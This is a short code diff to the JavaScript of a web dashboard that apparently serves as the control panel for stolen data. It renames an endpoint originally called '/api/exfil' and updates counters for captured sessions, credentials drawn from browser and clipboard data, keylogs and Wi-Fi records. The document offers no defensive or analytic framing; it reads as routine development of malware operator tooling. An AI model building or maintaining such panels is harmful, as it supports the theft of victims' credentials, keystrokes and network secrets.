@@ -566,7 +566,7 @@
             try {
                 const btn = document.querySelector('.refresh-btn');
                 btn.textContent = 'Loading...';
-                const resp = await fetch('/api/exfil?type=dashboard&_=' + Date.now());
+                const resp = await fetch('/api/dashboard_data?_=' + Date.now());
                 const data = await resp.json();
 
                 // Populate session dropdown
@@ -581,8 +581,8 @@
 
                 // Update stats
                 document.getElementById('totalSessions').textContent = data.sessions?.length || 0;
-                document.getElementById('totalCreds').textContent = data.credentials?.length || 0;
-                document.getElementById('totalKeylogs').textContent = data.keylogs?.length || 0;
+                document.getElementById('totalCreds').textContent = (data.browser?.length || 0) + (data.clipboard?.length || 0);
+                document.getElementById('totalKeylogs').textContent = data.keylog?.length || 0;
                 document.getElementById('totalWifi').textContent = data.wifi?.length || 0;
 
                 const oneHourAgo = Date.now() - 3600000;
